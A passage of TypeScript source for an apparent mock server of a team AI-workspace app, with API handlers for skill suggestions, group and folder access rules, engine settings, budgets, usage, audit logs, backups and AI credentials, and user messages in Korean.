      const card = this.skillCard(d!.sourceChatId)
      const name = card.inputs.length ? 'juganhoeui-hal-il' : 'gyeonjeokseo-sseugi'
      const rel = `skills/general/${name}/SKILL.md`
      for (const dir of ['skills', 'skills/general', `skills/general/${name}`]) this.files.set(dir, this.files.get(dir) ?? { type: 'folder', mtime: now() })
      const inputs = card.inputs.length ? `  inputs: |\n    ${JSON.stringify(card.inputs)}\n` : ''
      this.putFile(rel, `---\nname: ${name}\ndescription: "${c.body.title} — ${card.description}"\nmetadata:\n  title: "${c.body.title}"\n${inputs}${card.recurring ? '  recurring: weekly\n' : ''}---\n# ${c.body.title}\n`)
      this.skillMakers.set(rel, c.user.id)
      d!.saved = rel
      return { path: rel, name, title: c.body.title }
    },
    getResultSuggestion: () => ({ suggestion: this.resultSuggestion && !this.closedSuggestions.has(this.resultSuggestion.key) ? this.resultSuggestion : null }),
    dismissSuggestion: (c) => { this.closedSuggestions.add((c.body as { key: string }).key) },
    // onboarding G: no 7-day team goal card unless a test sets one (/__test/team-goal); Home then shows the owner checklist
    getTeamGoal: () => ({ goal: this.teamGoal }),
    // members as the server counts them (group_members): those the group lists and those whose groups name it
    listGroups:() => ({ items: this.groups.map((g) => ({ ...g, memberIds: [...new Set([...g.memberIds, ...this.users.filter((u) => u.groupIds.includes(g.id)).map((u) => u.id)])] })) }),
    createGroup: (c) => {
      const g: Group = { id: uuidv7(), name: c.body.name, description: c.body.description ?? null, memberIds: c.body.memberIds ?? [] }
      this.groups.push(g)
      // like the server: groups/<name>/ with "this group writes", tied to the group (Folder.groupId)
      const f: Folder = { id: uuidv7(), path: `groups/${g.name}`, exists: true, createdAt: now(), rules: [], groupId: g.id }
      f.rules = [{ id: uuidv7(), folderId: f.id, subjectType: 'group', subjectId: g.id, access: 'write', updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() }]
      this.folders.push(f)
      this.files.set('groups', { type: 'folder', mtime: now() })
      this.files.set(f.path, { type: 'folder', mtime: now() })
      return { status: 201, body: g }
    },
    updateGroup: (c) => Object.assign(this.groups.find((g) => g.id === c.params.id) ?? fail('not_found', 404), Object.fromEntries(Object.entries(c.body).filter(([, v]) => v !== undefined))),
    deleteGroup: (c) => {
      this.groups = this.groups.filter((g) => g.id !== c.params.id)
      // its rules go; its folder row stays, no longer a group's (the server's deleteGroup)
      for (const f of this.folders) {
        f.rules = f.rules.filter((r) => !(r.subjectType === 'group' && r.subjectId === c.params.id))
        if (f.groupId === c.params.id) f.groupId = null
      }
      return undefined
    },
    // like the server (admin/folder-keep.ts, the mock's names are case-sensitive): rows parked with a trashed folder are
    // not listed, and each row says why the API keeps it
    listFolders: () => ({ items: this.folders.filter((f) => !isParkedRow(f.path)).map((f) => ({ ...f, exists: f.path === '' || this.files.get(f.path)?.type === 'folder', keep: folderKeep(f.path, f.groupId ?? null, false), hidden: shownSegs(f.path) === null, rulesHash: rulesHash(f.rules) })) }),
    // ---- team skills ----
    listSkillManagers: () => this.skillManagersResponse(),
    setSkillManager: (c) => {
      const { subjectType, subjectId, enabled } = c.body as { subjectType: 'user' | 'group'; subjectId: string; enabled: boolean }
      const p = (c.body.path as string) ?? 'skills'
      const u = this.users.find((x) => x.id === subjectId)
      if (subjectType === 'user' && (!u || u.role !== 'member')) fail('validation', 400, '팀장·관리자는 항상 팀 스킬을 관리해요.')
      if (!(p === 'skills' || p.startsWith('skills/'))) fail('validation', 400, 'skills/ 안의 볼 수 있는 폴더를 골라 주세요.')
      if (enabled && !this.files.has(p)) this.files.set(p, { type: 'folder', mtime: now() })
      // the same rule Admin > 폴더 권한 shows
      let f = this.folders.find((x) => x.path === p)
      if (!f && enabled) {
        f = { id: uuidv7(), path: p, exists: true, createdAt: now(), rules: [{ id: uuidv7(), folderId: '', subjectType: 'everyone', subjectId: null, access: 'read', updatedBy: null, updatedAt: now() }] }
        f.rules[0]!.folderId = f.id
        this.folders.push(f)
      }
      if (f) {
        f.rules = f.rules.filter((r) => !(r.subjectType === subjectType && r.subjectId === subjectId))
        if (enabled) f.rules.push({ id: uuidv7(), folderId: f.id, subjectType, subjectId, access: 'write', updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() })
        // like the server: skills/ keeps a rule ("admins: write", which changes nobody's access)
        if (!f.rules.length && p === 'skills') f.rules.push({ id: uuidv7(), folderId: f.id, subjectType: 'role', subjectId: 'admin', access: 'write', updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() })
      }
      return this.skillManagersResponse()
    },
    listSkillChanges: () => ({ items: this.skillChanges, nextCursor: null }),
    skillsOverview: (c) => ({
      managedFolders: this.managed(c.user),
      suggestFolders: ['skills', 'skills/재무'],
      pendingReview: this.suggestions.filter((s) => s.status === 'pending' && this.manages(c.user, s.targetFolder)).length,
      myPending: this.suggestions.filter((s) => s.status === 'pending' && s.suggester.id === c.user.id).length,
      // open share proposals others made to the person's groups (docs/DECISIONS.md "Group skills")
      sharesToReview: (() => {
        const st = (this as unknown as { skillShareState?: { gen: number; rows: { share: { status: string }; owner: string; group: string | null }[] } }).skillShareState
        const mineGroups = new Set(this.groupSkillRoots(c.user).map((g) => g.id))
        return st?.gen === this.generation ? st.rows.filter((r) => r.owner !== c.user.id && r.group !== null && mineGroups.has(r.group) && (r.share.status === 'checking' || r.share.status === 'ready')).length : 0
      })(),
      ...(this.aiList ? { aiList: this.aiList } : {}),
    }),
    listSkillSuggestions: (c) => ({
      items: this.suggestions.filter((s) => (c.query.scope === 'review' ? this.manages(c.user, s.targetFolder) : s.suggester.id === c.user.id)).map((s) => this.suggestionFor(s, c.user)),
      nextCursor: null,
    }),
    getSkillSuggestion: (c) => {
      const s = this.suggestions.find((x) => x.id === c.params.id)
      if (!s || !(s.suggester.id === c.user.id || this.manages(c.user, s.targetFolder))) fail('not_found', 404)
      return this.suggestionFor(s!, c.user)
    },
    createSkillSuggestion: (c) => {
      const src = c.body.source as { kind: 'message'; chatId: string; messageId: string } | { kind: 'file'; path: string }
      if (src.kind === 'message' && !this.messages.some((m) => m.id === src.messageId && m.chatId === src.chatId && this.chats.some((ch) => ch.id === src.chatId))) fail('not_found', 404)
      if (src.kind === 'file' && !src.path.startsWith(`users/${c.user.id}/`)) fail('not_found', 404)
      const s: SkillSuggestion = {
        id: uuidv7(), status: 'pending', targetFolder: c.body.targetFolder ?? 'skills', name: c.body.name, description: c.body.description ?? '', content: c.body.content,
        source: { kind: src.kind, path: src.kind === 'file' ? src.path : null }, suggester: { id: c.user.id, name: c.user.name }, reviewer: null, reviewNote: null, resultPath: null,
        createdAt: now(), reviewedAt: null, canReview: false,
      }
      this.suggestions.unshift(s)
      this.publish({ type: 'notice', data: { level: 'info', code: 'skill_suggested', message: `${c.user.name} 님이 스킬을 제안했어요: ${s.name} → ${s.targetFolder}/`, link: `/skills?review=${s.id}` } })
      return { status: 201, body: this.suggestionFor(s, c.user) }
    },
    approveSkillSuggestion: (c) => {
      const s = this.suggestions.find((x) => x.id === c.params.id)
      if (!s || !(s.suggester.id === c.user.id || this.manages(c.user, s.targetFolder))) fail('not_found', 404)
      if (!this.manages(c.user, s!.targetFolder) || !this.manages(c.user, c.body.targetFolder)) fail('forbidden', 403, '이 폴더의 팀 스킬을 관리할 권한이 없어요.')
      if (s!.status !== 'pending') fail('conflict', 409, '이미 처리된 제안이에요.')
      const file = `${c.body.targetFolder}/${(c.body.fileName ?? c.body.name).trim().replace(/\s+/g, '-')}.md`
      this.putFile(file, `---\nname: ${JSON.stringify(c.body.name)}\ndescription: ${JSON.stringify(c.body.description ?? '')}\n---\n${c.body.content}`)
      Object.assign(s!, { status: 'approved', reviewer: { id: c.user.id, name: c.user.name }, reviewedAt: now(), resultPath: file, targetFolder: c.body.targetFolder, name: c.body.name, description: c.body.description, content: c.body.content })
      this.skillChange({ id: uuidv7(), at: now(), actor: { id: c.user.id, name: c.user.name }, path: file, change: 'create', from: null, byAi: false, kind: 'skill' })
      this.publish({ type: 'notice', data: { level: 'info', code: 'skill_suggestion_reviewed', message: `제안한 스킬이 등록됐어요: ${s!.name} (${file})`, link: `/skills?mine=${s!.id}` } })
      return this.suggestionFor(s!, c.user)
    },
    rejectSkillSuggestion: (c) => {
      const s = this.suggestions.find((x) => x.id === c.params.id)
      if (!s || !(s.suggester.id === c.user.id || this.manages(c.user, s.targetFolder))) fail('not_found', 404)
      if (!this.manages(c.user, s!.targetFolder)) fail('forbidden', 403)
      if (s!.status !== 'pending') fail('conflict', 409)
      Object.assign(s!, { status: 'rejected', reviewer: { id: c.user.id, name: c.user.name }, reviewedAt: now(), reviewNote: c.body.note || null })
      this.publish({ type: 'notice', data: { level: 'info', code: 'skill_suggestion_reviewed', message: `제안한 스킬이 거절됐어요: ${s!.name}`, link: `/skills?mine=${s!.id}` } })
      return this.suggestionFor(s!, c.user)
    },
    createFolder: (c) => {
      if (isTeamDefaultFolder(c.body.path, false) && !c.body.rules?.length) fail('validation', 400, serverMsg('teamFolderKeepsRules', c.user.locale), { 'body.rules': 'shared/ and skills/ keep at least one rule' })
      // like the server: rules made there meanwhile (the hash the editor started from is not the rules' now)
      if (c.body.expectedHash !== undefined && c.body.expectedHash !== rulesHash(this.folders.find((f) => f.path === c.body.path)?.rules ?? [])) throw new Fail('conflict', 409, serverMsg('rulesChanged', c.user.locale), undefined, { reason: 'rules_changed' })
      // like the server (create defaults to true): the folder and those above it are made
      if (c.body.create !== false) for (let i = 1, parts = String(c.body.path).split('/'); c.body.path && i <= parts.length; i++) { const d = parts.slice(0, i).join('/'); if (!this.files.has(d)) this.files.set(d, { type: 'folder', mtime: now() }) }
      const f: Folder = { id: uuidv7(), path: c.body.path, exists: c.body.path === '' || this.files.get(c.body.path)?.type === 'folder', createdAt: now(), rules: [] }
      f.rules = (c.body.rules ?? []).map((r: Json) => ({ id: uuidv7(), folderId: f.id, subjectType: r.subjectType, subjectId: r.subjectId ?? null, access: r.access, updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() }))
      this.folders.push(f)
      return { status: 201, body: { ...f, rulesHash: rulesHash(f.rules) } }
    },
    putFolderRules: (c) => {
      const f = this.folders.find((x) => x.id === c.params.id && !isParkedRow(x.path)) ?? fail('not_found', 404)
      if (isTeamDefaultFolder(f.path, false) && !c.body.rules.length) fail('validation', 400, serverMsg('teamFolderKeepsRules', c.user.locale), { 'body.rules': 'shared/ and skills/ keep at least one rule' })
      // like the server: another admin changed the rules since the editor read them
      if (c.body.expectedHash !== undefined && c.body.expectedHash !== rulesHash(f.rules)) throw new Fail('conflict', 409, serverMsg('rulesChanged', c.user.locale), undefined, { reason: 'rules_changed' })
      f.rules = c.body.rules.map((r: Json) => ({ id: uuidv7(), folderId: f.id, subjectType: r.subjectType, subjectId: r.subjectId ?? null, access: r.access, updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() }))
      return { ...f, exists: f.path === '' || this.files.get(f.path)?.type === 'folder', keep: folderKeep(f.path, f.groupId ?? null, false), hidden: shownSegs(f.path) === null, rulesHash: rulesHash(f.rules) }
    },
    deleteFolder: (c) => {
      const f = this.folders.find((x) => x.id === c.params.id && !isParkedRow(x.path)) ?? fail('not_found', 404)
      // the server refuses these at the admin API (routes/admin.ts): shared/ and skills/, and a group's folder
      const keep = folderKeep(f.path, f.groupId ?? null, false)
      if (keep === 'team') fail('conflict', 409, serverMsg('teamFolderKeepsRules', c.user.locale))
      if (keep === 'group') fail('conflict', 409, serverMsg('groupFolderKeepsRow', c.user.locale))
      this.folders = this.folders.filter((x) => x.id !== f.id)
      return undefined
    },
    explainFolderAccess: (c) => this.explainFolder(c.query),
    explainPersonAccess: (c) => {
      const u = this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      return this.explainPerson({ user: u, role: u.role, groupIds: u.groupIds }, { prefix: c.query.prefix, cursor: c.query.cursor, limit: c.query.limit ? Number(c.query.limit) : undefined })
    },
    explainAccessTree: (c) => this.explainTree(c.query),
    previewFolderEdit: (c) => this.explainEdit(c.body, c.user.locale),
    explainNewPersonAccess: (c) => {
      if ((c.body.groupIds as string[]).some((g) => !this.groups.some((x) => x.id === g))) fail('validation', 400, '없는 그룹이 들어 있어요.', { 'body.groupIds': 'unknown group' })
      return this.explainPerson({ user: null, role: c.body.role, groupIds: [...new Set(c.body.groupIds as string[])] }, c.body)
    },
    previewRules: (c) => ({
      folders: c.body.changes.map((ch: Json) => ({ path: ch.path, users: this.users.map((u) => ({ user: { id: u.id, name: u.name }, role: u.role, before: u.role === 'owner' ? 'write' : 'none', after: u.role === 'owner' ? 'write' : (ch.rules as Json[]).some((r) => r.subjectType === 'everyone') ? 'read' : 'none' })) })),
      losing: [{ user: { id: 'bob', name: 'Bob' }, paths: [c.body.changes[0].path], chatsReset: 2 }],
    }),
    engines: () => this.enginesResponse(),
    updateEngines: (c) => {
      if (c.body.defaultEngine) this.settings.defaultEngine = c.body.defaultEngine
      if (c.body.concurrency) this.settings.concurrency = c.body.concurrency
      if (c.body.enabled?.codex !== undefined) this.codexEnabled = c.body.enabled.codex
      if (c.body.enabled?.api !== undefined) this.apiEngineEnabled = c.body.enabled.api
      if (c.body.limitFallback === true && !this.codexEnabled) fail('conflict', 409, 'Codex가 꺼져 있어 한도 대체를 켤 수 없어요.')
      if (c.body.limitFallback !== undefined) this.limitFallback = c.body.limitFallback
      if (!this.codexEnabled) this.limitFallback = false
      if (c.body.memberChoice) this.memberChoice = c.body.memberChoice
      this.publish({ type: 'notice', data: { level: 'info', code: 'engine_choice_changed', message: '' } })
      return this.enginesResponse()
    },
    checkEngine: (c) => this.enginesResponse().engines.find((e) => e.id === c.params.id) ?? fail('not_found', 404),
    // the team's API engine: not set up (like a fresh server)
    getApiEngine: () => ({ baseUrl: null, model: null, label: null, hasKey: false }),
    putApiEngine: (c) => c.body.password !== this.passwords.get(c.user.username) ? fail('forbidden', 403, '비밀번호가 맞지 않아요.', { 'body.password': 'wrong password' }) : ({ baseUrl: c.body.baseUrl, model: c.body.model, label: c.body.label ?? null, hasKey: !!c.body.key }),
    listBudgets: () => ({ items: this.budgets }),
    createBudget: (c) => {
      const b: Budget = { id: uuidv7(), subjectType: c.body.subjectType, subjectId: c.body.subjectId, period: c.body.period, limitUsd: c.body.limitUsd, limitTokens: c.body.limitTokens ?? null, action: c.body.action, usedUsd: 0, usedTokens: 1234 }
      this.budgets.push(b)
      return { status: 201, body: b }
    },
    updateBudget: (c) => Object.assign(this.budgets.find((b) => b.id === c.params.id) ?? fail('not_found', 404), c.body),
    deleteBudget: (c) => {
      this.budgets = this.budgets.filter((b) => b.id !== c.params.id)
      return undefined
    },
    settings: () => ({ ...this.settings, speechProvider: this.speechNow() }),
    // SpeechKeyStatus.hosted (0.2.17): the hosting service's free hours; none on this mock server
    speechKey: () => ({ ...this.speechKey, hosted: null }),
    speechHost: () => this.speechHost,
    setSpeechKey: (c) => {
      this.speechKey = c.body.sealed ? { set: true, hint: 'mock', updatedAt: now() } : { set: false, hint: null, updatedAt: null }
      return { ...this.speechKey, hosted: null }
    },
    updateSettings: (c) => {
      const before = this.settings.defaultLocale
      const policyBefore = this.settings.browserAllowAll
      // like server/src/admin/settings.ts: a new speech provider starts "Turn video sound into text" from its default
      const providerChanged = c.body.speechProvider !== undefined && c.body.speechProvider !== this.speechNow()
      if (c.body.speechProvider !== undefined) this.speechChosen = true
      Object.assign(this.settings, c.body)
      if (providerChanged && c.body.aiMediaTranscripts === undefined) this.settings.aiMediaTranscripts = null
      this.syncLocales()
      if (this.settings.defaultLocale !== before) this.publish(LOCALE_CHANGED)
      if (this.settings.browserAllowAll !== policyBefore) this.publish(BROWSER_POLICY_CHANGED)
      return { ...this.settings, speechProvider: this.speechNow() }
    },
    // like server/src/admin/team-icon.ts: the same checks (shared/src/team-icon.ts) and words
    putTeamIcon: async (c) => {
      const bytes = new Uint8Array(await c.req.arrayBuffer())
      const r = bytes.byteLength > TEAM_ICON_MAX_BYTES ? ({ ok: false, problem: 'too_big' } as const) : checkTeamIcon(bytes, c.query.type)
      if (!r.ok) {
        const message = TEAM_ICON_TEXT[r.problem].ko
        if (r.problem === 'too_big') fail('payload_too_large', 413, message)
        throw new Fail('validation', 400, message, { body: r.problem }, { reason: r.problem })
      }
      this.teamIcon = { bytes, type: r.type, width: r.width, height: r.height, version: sha256Hex(bytes).slice(0, 16) }
      this.publish(TEAM_ICON_CHANGED)
      return { version: this.teamIcon.version, type: r.type, width: r.width, height: r.height, size: bytes.byteLength }
    },
    // like server/src/routes/knowledge-graph.ts: on needs CodeGraph; off clears the folders; added folders outside users/
    knowledgeGraphStatus: () => this.kg,
    updateKnowledgeGraph: (c) => {
      if (c.body.enabled === true && !this.kg.available) throw new Fail('conflict', 409, 'CodeGraph is not installed', undefined, { reason: 'unavailable' })
      if (c.body.added !== undefined) {
        const added = c.body.added as string[]
        for (const a of added) {
          if (a.startsWith('users')) throw new Fail('validation', 400, 'personal', { 'body.added': 'personal' }, { reason: 'personal' })
          if (!/^[\w.-]+(\/[\w.-]+)*$/.test(a) || a.startsWith('nope')) throw new Fail('validation', 400, 'not found', { 'body.added': 'not_found' }, { reason: 'not_found' })
        }
        this.kg = { ...this.kg, added: [...new Set(added)] }
      }
      if (c.body.enabled === false) this.kg = { ...this.kg, enabled: false, roots: [], personal: { folders: 0, files: 0, symbols: 0 }, diskBytes: 0, busy: 0 }
      if (c.body.enabled === true && !this.kg.enabled) this.kg = { ...mockKnowledgeGraph(true), added: this.kg.added, documents: this.kg.documents }
      // documents: off deletes the index (nothing listed); on brings the made-up folders back
      if (c.body.documents === false) this.kg = { ...this.kg, documents: mockKgDocuments(false) }
      if (c.body.documents === true && !this.kg.documents.enabled) this.kg = { ...this.kg, documents: mockKgDocuments(true) }
      return this.kg
    },
    // like the server: part code, documents or (none) both, of the parts that are on
    rebuildKnowledgeGraph: (c) => {
      const part = c.body.part as 'code' | 'documents' | undefined
      const code = this.kg.enabled && part !== 'documents', docs = this.kg.documents.enabled && part !== 'code'
      if (!code && !docs) throw new Fail('conflict', 409, 'off', undefined, { reason: 'off' })
      const d = this.kg.documents
      this.kg = {
        ...this.kg,
        ...(code ? { roots: this.kg.roots.map((r) => ({ ...r, status: 'pending' as const, files: 0, symbols: 0 })), busy: this.kg.roots.length } : {}),
        documents: docs ? { ...d, folders: d.folders.map((f) => ({ ...f, status: 'pending' as const })), busy: d.folders.length } : d,
      }
      // the rebuild "finishes" a moment later
      setTimeout(() => {
        const fresh = mockKnowledgeGraph(true)
        this.kg = { ...this.kg, ...(code ? { roots: fresh.roots, busy: 0 } : {}), documents: docs ? fresh.documents : this.kg.documents }
      }, 1500)
      return this.kg
    },
    deleteTeamIcon: () => {
      if (this.teamIcon) this.publish(TEAM_ICON_CHANGED)
      this.teamIcon = null
      return undefined
    },
    // like server/src/admin/budgets.ts usage: made-up rows per Group by; with series=1 the same rows spread over the
    // last three days of the range (tokens per day by key, adding up to the rows), with facets=1 the filter choices.
    // A person filter (user=bob) keeps only that person's row and totals.
    usage: (c) => {
      const rows = c.query.groupBy === 'skill'
        ? [{ key: 'skills/report.md', label: '주간 보고서', turns: 12, inputTokens: 12000, outputTokens: 3400, costUsd: 0.42 }]
        : c.query.groupBy === 'model'
          ? [{ key: 'model-test', label: 'model-test', turns: 15, inputTokens: 14000, outputTokens: 4100, costUsd: 0.47 }]
          : [{ key: 'olga', label: 'Olga', turns: 12, inputTokens: 12000, outputTokens: 3400, costUsd: 0.42 }, { key: 'bob', label: 'Bob', turns: 3, inputTokens: 2000, outputTokens: 700, costUsd: 0.05 }]
      const only = c.query.user && c.query.groupBy === 'user' ? rows.filter((r) => r.key === c.query.user) : rows
      const totals = c.query.user === 'bob' ? { turns: 3, inputTokens: 2000, outputTokens: 700, costUsd: 0.05 } : { turns: 15, inputTokens: 14000, outputTokens: 4100, costUsd: 0.47 }
      const to = new Date(c.query.to ?? now())
      const day = (back: number) => new Date(to.getTime() - (back + 1) * 86_400_000 + 3600_000).toISOString().slice(0, 10)
      const split = [0.5, 0.3, 0.2]
      const series = c.query.series ? only.flatMap((r) => split.map((f, i) => ({ day: day(i), key: c.query.groupBy === 'day' ? 'all' : r.key, turns: Math.round(r.turns * f), inputTokens: Math.round(r.inputTokens * f), outputTokens: Math.round(r.outputTokens * f) }))) : undefined
      const facets = c.query.facets ? {
        users: [{ key: 'bob', label: 'Bob' }, { key: 'olga', label: 'Olga' }],
        engines: [{ key: 'claude-code', label: 'claude-code' }, { key: 'codex', label: 'codex' }],
        models: [{ key: '', label: '(default)' }, { key: 'model-test', label: 'model-test' }],
        credentials: [],
        groups: this.groups.map((g) => ({ key: g.id, label: g.name })),
      } : undefined
      return { from: c.query.from ?? now(), to: c.query.to ?? now(), rows: only, totals, ...(series ? { series } : {}), ...(facets ? { facets } : {}) }
    },
    // like server/src/admin/audit.ts listAudit: newest first, filtered by kind, person, path (file events only) and
    // [from, to); paged by an index cursor. Made-up rows: today's invite first, repeats, a refused AI tool call, a team
    // skill change yesterday, and a sign-in every day before that (enough to scroll and to need "Load more").
    audit: (c) => {
      const f = c.query
      const rows = auditRows().filter((e) => (!f.source || e.source === f.source) && (!f.actor || e.actor?.id === f.actor)
        && (f.path === undefined || (e.source === 'file' && (e.target === f.path || (e.target ?? '').startsWith(f.path + '/'))))
        && (!f.from || e.at >= new Date(f.from).toISOString()) && (!f.to || e.at < new Date(f.to).toISOString()))
      const start = f.cursor ? Number(f.cursor) : 0
      const limit = Number(f.limit ?? 50)
      const items = rows.slice(start, start + limit)
      return { items, nextCursor: start + limit < rows.length ? String(start + limit) : null }
    },
    diagnostics: () => ({ version: this.serverVersion, host: { os: 'darwin', arch: 'arm64', hostname: 'mac-mini' }, disk: { teamFolderFreeBytes: 500e9, dataFreeBytes: 500e9 }, queue: { running: 0, queued: 0, concurrency: 2 }, checks: [{ id: 'relay', group: 'relay', label: 'Relay connection', status: 'warn', detail: 'Relay not configured (dev)' }, { id: 'disk', group: 'disk', label: 'Disk space', status: 'ok', detail: null }], generatedAt: now() }),
    updateStatus: () => ({ current: this.serverVersion, channel: 'stable', available: null, lastCheckedAt: now(), previous: null, managed: this.cloud }),
    // like server/src/system/after-update.ts: the HWP plugin to-do while the plugin is not on and not dismissed
    afterUpdateActions: () => ({
      items: this.afterDismissed.includes('hwp-plugin') || this.plugins.installed.some((p) => p.id === 'app.trina.hwp-preview' && p.enabled) ? [] : [{ id: 'hwp-plugin', since: '0.4.0-beta.2', to: '/admin/plugins?focus=app.trina.hwp-preview' }],
    }),
    dismissAfterUpdate: (c) => { if (c.params.id !== 'hwp-plugin') fail('not_found', 404); if (!this.afterDismissed.includes(c.params.id)) this.afterDismissed.push(c.params.id); return undefined },
    // like server/src/system/storage.ts: a 50 GB disk, 41 GB used (over 80%); the plan on Team AX Cloud
    storage: () => ({
      totalBytes: 50 * 1024 ** 3, usedBytes: 41 * 1024 ** 3, freeBytes: 9 * 1024 ** 3, percent: 82, level: 'warn', reserveBytes: 1024 ** 3, writesRefused: false, graceEndsAt: null,
      breakdown: { team: 30 * 1024 ** 3, history: 4 * 1024 ** 3, trash: 3 * 1024 ** 3, backups: 2 * 1024 ** 3, models: 0.5 * 1024 ** 3, data: 0.3 * 1024 ** 3, app: 0.2 * 1024 ** 3, other: 1024 ** 3 },
      measuredAt: now(), planDiskGiB: this.cloud ? 50 : null,
    }),
    // like server/src/system/managed.ts: the plan card and the operator's notices on Team AX Cloud (none self-hosted)
    plan: (c) => ({
      plan: this.cloud ? {
        id: 'team', name: ({ ko: '팀', en: 'Team', id: 'Tim', ja: 'チーム', es: 'Equipo' } as Record<string, string>)[c.user.locale ?? 'ko'] ?? 'Team', maxConcurrency: 3, concurrency: Math.min(3, this.settings.concurrency),
        maxActiveMembers: 12, activeMembers: this.users.filter((u) => u.status === 'active').length, diskGiB: 50, memoryMiB: 4096, cpuCores: 3,
        localBackupRetentionDays: 3, links: { account: 'https://app.teamax.example/billing', status: 'https://status.teamax.example', support: 'support@teamax.example' },
        updatedAt: now(),
      } : null,
    }),
    managedNotices: (c) => ({
      items: !this.cloud ? [] : [
        ...(c.user.role === 'owner' ? [{ id: 'grant-1', level: 'critical' as const, text: '지원팀이 11월 6일 18시까지 진단 접근 권한을 가지고 있어요', link: null, until: null, dismissible: false }] : []),
        { id: 'maint-1', level: 'info' as const, text: '오늘 밤 2시에 점검이 있어요', link: 'https://status.teamax.example', until: null, dismissible: true },
      ],
    }),
    listBackups: () => ({ items: [{ id: 'b1', kind: 'daily', createdAt: now(), size: 123456, scope: 'full' }] }),
    startBackup: (c) => {
      const id = uuidv7()
      const job: Job = { id, kind: 'backup', status: 'running', progress: 0, message: 'Backing up', result: null, error: null, createdAt: now(), finishedAt: null }
      this.jobs.set(id, job)
      setTimeout(() => this.publish({ type: 'job.progress', data: { jobId: id, kind: 'backup', progress: 0.5, message: 'Copying database' } }), 50)
      setTimeout(() => {
        Object.assign(job, { status: 'done', progress: 1, result: { backupId: 'b2', size: 999, createdAt: now() }, finishedAt: now() })
        this.publish({ type: 'job.done', data: { job } })
      }, 200)
      void c
      return { status: 202, body: { jobId: id } }
    },
    connection: () => this.connection,
    updateConnection: (c) => {
      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403)
      if (!(this.connection.availableModes ?? []).includes(c.body.mode)) fail('conflict', 409, 'This connection mode is not available in this version yet.')
      if (c.body.mode !== 'direct-only' && !(c.body.teamName ?? this.connection.teamName)) fail('validation', 400)
      this.connection = { ...this.connection, mode: c.body.mode, teamName: c.body.teamName ?? this.connection.teamName, state: c.body.mode === 'direct-only' ? 'disabled' : 'connecting', detail: 'Applies after the server restarts.' }
      return this.connection
    },
    // like a server outside office mode (no automatic office updates)
    officeUpdateStatus: () => null,
    officeUpdateAction: () => fail('conflict', 409, '사무실 모드가 아니라 자동 업데이트가 없어요.'),
    // ---------------- AI connections (like server/src/routes/credentials.ts) ----------------
    listCredentials: () => ({ items: this.credentials.map((c) => this.credentialView(c)), memberOwn: this.credMemberOwn, sharedSubscriptions: this.credSharedSubscriptions, allowedKinds: ['anthropic-oauth', 'anthropic-api-key', 'chatgpt', 'openai-api-key'], pricesAsOf: '2026-10-22' }),
    sealingKey: () => this.sealer.publicKey(),
    createCredential: async (c) => {
      return { status: 201, body: await this.addCredential(c.user, c.body, false) }
    },
    createMyCredential: async (c) => {
      if (!this.credMemberOwn) fail('forbidden', 403)
      return { status: 201, body: await this.addCredential(c.user, c.body, true) }
    },
    updateCredential: (c) => {
      const x = this.credentials.find((y) => y.id === c.params.id) ?? fail('not_found', 404)
      if (c.body.label !== undefined) x.label = c.body.label
      if (c.body.priority !== undefined) x.priority = c.body.priority
      if (c.body.disabled !== undefined) { x.disabled = c.body.disabled; x.state = x.disabled ? 'disabled' : 'ok' }
      if (c.body.assignments) x.assignments = c.body.assignments.map((a: { subjectType: 'group' | 'user'; subjectId: string }) => ({ ...a, name: a.subjectType === 'group' ? this.groups.find((g) => g.id === a.subjectId)?.name ?? a.subjectId : this.users.find((u) => u.id === a.subjectId)?.name ?? a.subjectId }))
      if (c.body.spendLimit) x.spendLimit = c.body.spendLimit
      this.credentials.sort((a, b) => a.priority - b.priority)
      return x
    },
    replaceCredentialSecret: async (c) => {
      const x = this.credentials.find((y) => y.id === c.params.id) ?? fail('not_found', 404)
      await this.sealer.unseal(c.body.sealed, 'credential.replace').catch(() => fail('validation', 400))
      x.state = 'ok'; x.detail = null
      return x
    },
    deleteCredential: (c) => {
      if (!this.credentials.some((x) => x.id === c.params.id)) fail('not_found', 404)
      this.credentials = this.credentials.filter((x) => x.id !== c.params.id)
      return undefined
    },
    deleteMyCredential: (c) => {
      const x = this.credentials.find((y) => y.id === c.params.id && y.owner?.id === c.user.id) ?? fail('not_found', 404)
      this.credentials = this.credentials.filter((y) => y.id !== x.id)
      return undefined
    },
    checkCredential: (c) => {
      const x = this.credentials.find((y) => y.id === c.params.id) ?? fail('not_found', 404)
      if (x.state === 'unverified') { x.state = 'ok'; x.detail = null; x.checkedAt = now() }
      return x
    },
    updateCredentialSettings: (c) => {
      if (c.body.sharedSubscriptions === true && !this.credSharedSubscriptions && c.body.acknowledgedSharedSubscriptionRisk !== true) fail('validation', 400)
      if (c.body.memberOwn !== undefined) this.credMemberOwn = c.body.memberOwn
      if (c.body.sharedSubscriptions !== undefined) this.credSharedSubscriptions = c.body.sharedSubscriptions
      return { memberOwn: this.credMemberOwn, sharedSubscriptions: this.credSharedSubscriptions }
    },
    myCredentials: (c) => ({ allowed: this.credMemberOwn, allowedKinds: ['anthropic-oauth', 'anthropic-api-key', 'chatgpt', 'openai-api-key'], items: this.credentials.filter((x) => x.owner?.id === c.user.id) }),
    startCredentialLogin: (c) => {
      if (!this.credSharedSubscriptions) fail('forbidden', 403)
      return { status: 202, body: this.startLogin(c.user, c.body.label, false, c.body.reconnectId, c.body.kind) }
    },
    startMyCredentialLogin: (c) => {
      if (!this.credMemberOwn) fail('forbidden', 403)
      return { status: 202, body: this.startLogin(c.user, c.body.label, true, c.body.reconnectId, c.body.kind) }
    },
    submitCredentialLoginCode: (c) => this.loginCode(c.params.id, c.user, c.body.sealed),
    submitMyCredentialLoginCode: (c) => this.loginCode(c.params.id, c.user, c.body.sealed),
    getCredentialLogin: (c) => this.loginOf(c.params.id, c.user),
    getMyCredentialLogin: (c) => this.loginOf(c.params.id, c.user),
    cancelCredentialLogin: (c) => { this.cancelLogin(c.params.id, c.user, true); return undefined },
    cancelMyCredentialLogin: (c) => { this.cancelLogin(c.params.id, c.user); return undefined },

    // Google Drive (server/src/routes/drive.ts): this test server has no Google client, like a server not set up for it.
    // e2e tests that need the other states answer these addresses themselves (test/e2e/drive.spec.ts).
    myDriveConnection: (c) => (this.driveClient === 'none'
